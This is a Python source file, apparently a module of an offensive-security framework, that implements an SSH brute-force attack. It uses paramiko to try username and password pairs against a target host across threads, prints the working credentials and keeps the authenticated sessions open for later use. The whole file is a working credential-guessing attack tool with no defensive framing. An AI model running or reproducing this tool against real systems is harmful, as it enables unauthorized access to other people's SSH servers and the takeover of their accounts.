from jframework.modules.login._bruteforce import _Bruteforce
import threading
import sys
hasParamiko = True
try:
    import paramiko
except:
    print("✕ It's required install paramiko module to run sshbruteforce")
    hasParamiko = False


class Sshbruteforce(_Bruteforce):

    def __init__(self):
        super(Sshbruteforce, self).__init__()
        self.lock = threading.Lock()
        self.sessions = []

    def worker(self, user, password):
        if(self.abortar):
            return
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.HOST, username=user, password=password)
            print("[+] " + str(user) + ":" + str(password) + " >> OK")
            self.lock.acquire()
            self.sessions.append({"id": 0, "ip": self.HOST, "session": client, "user": user, "type":"ssh"})
            self.lock.release()
        except Exception as e:
            if "is not subscriptable" in str(e):
                print("No SSH service")
                self.abortar = True
                self.num_threads -= 1
                sys.exit(0)
            if(self.verb):
                print("[-] " + str(user) + ":" + str(password) + " >> failed")
            try:
                client.close()
            except:
                pass
        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        if (not hasParamiko):
            print("✕  It's required install paramiko")
            return
        self.sessions = []
        super(Sshbruteforce, self).run()
        list_sessions = []

        for session in self.sessions:
            list_sessions.append(session)

        print(len(list_sessions), " sessions open")
        return list_sessions